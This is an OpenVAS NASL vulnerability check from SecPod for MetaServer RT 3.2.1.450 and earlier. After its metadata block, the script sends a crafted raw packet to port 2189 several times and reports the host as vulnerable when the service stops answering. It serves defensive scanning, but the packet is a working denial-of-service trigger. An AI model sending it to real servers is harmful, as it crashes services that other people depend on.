###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_metaserver_rt_multiple_dos_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# MetaServer RT Multiple Remote Denial of Service Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902569");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-09-22 10:24:03 +0200 (Thu, 22 Sep 2011)");
  script_bugtraq_id(49696);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("MetaServer RT Multiple Remote Denial of Service Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/46059");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17879/");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/metaserver_1-adv.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(2189);
  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
arbitrary code on the system or cause a denial of service condition.");
  script_tag(name:"affected", value:"MetaServer RT version 3.2.1.450 and prior.");
  script_tag(name:"insight", value:"Multiple flaws are due to an error when processing certain
packets and can be exploited to cause a crash via a specially crafted packet.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running MetaServer RT and is prone to multiple remote
denial of service vulnerabilities.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


port = 2189;
if(!get_port_state(port)){
 exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

req = raw_string( 0xcd, 0xab, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x52, 0x4f, 0x53, 0x43,
                  0x4f );

## Sending Attack
send(socket:soc, data:req);
res = recv(socket:soc, length:200);
close(soc);

if("Metastock" >!< res){
  exit(0);
}

## Send multiple reconnection request
for(i = 0; i < 5; i++)
{
  soc1 = open_sock_tcp(port);
  if(!soc1){
    break;
  }

  send(socket:soc1, data:req);
  close(soc1);
  sleep(1);
}

soc = open_sock_tcp(port);
if(!soc)
{
  security_message(port);
  exit(0);
}
close(soc);
